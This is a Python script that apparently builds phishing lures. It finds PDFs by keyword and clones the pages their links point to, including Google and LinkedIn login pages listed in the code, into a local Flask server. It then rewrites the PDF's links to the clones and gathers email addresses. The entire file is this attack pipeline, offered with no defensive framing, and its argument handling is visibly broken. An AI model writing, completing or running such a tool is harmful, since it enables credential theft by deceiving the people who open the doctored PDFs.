import PDFProcessor
import Clone as Builder
import SearchEngine
import os
from pathlib import Path
import GetEmails
import sys 


args=str(sys.argv)
sargs=''
for i in range(1,len(args)):
    sargs+=args[i]

print(sargs)




keyWords=args [1]
def SearchPdf(keyword):
    my_keys_file=Path('KEYS/keywords.txt')
    if my_keys_file.exists():
        # remove the file using os
        os.remove('KEYS/keywords.txt')
    # write the keywords in a .txt file to read it for extract emails...
    with open('KEYS/keywords.txt','w') as f:
        f.write(keyword)
        f.close()
    

    
    NamesList=SearchEngine.Search_PDFs(keyword)
    for fileName in NamesList:
        fileName=fileName+'.pdf'
        BuildServer(fileName)
    
    GetEmails.GetEmails()
    



dict={}


Links=['https://www.linkedin.com/home/?originalSubdomain=il','https://accounts.google.com/']

i=1


def BuildServer (fileName,n=5):
    Links=PDFProcessor.getLinks('PDFRoom/'+str(fileName))
    global i
    
    Header="""from flask import render_template\n
from flask import Flask, render_template,request \n
app=Flask(__name__)\n

    """



    Basic="""
@app.route('/')
def indexREPLACEME():\n
    return render_template("GIT.html")\n
    """

    NewRoute="""
@app.route('/REPLACEME')
def indexREPLACEME():\n
    return render_template("REPLACEME.html")\n
    """

    memoryvar=NewRoute

    End="""
if __name__ == '__main__':\n
    app.run( port=8080 ,debug=True)

    """
    f = open("app.py", "w")
    f.write(Header)
    f.write(Basic)
    
    

    for link in Links:
        NewFileName=str(i)+'.html'
        dict[link]='http://localhost:8080/'+NewFileName
        Builder.Clone(link,NewFileName)
        NewRoute=NewRoute.replace('REPLACEME', str(i), 3)
        f.write(NewRoute)
        NewRoute=memoryvar
        i+=1
        if n==0:
            break
        n-=1

    f.write(End)
    f.close()
    PDFProcessor.swap_links(dict,fileName)
    print('Server file was built at app.py')


SearchPdf(sargs)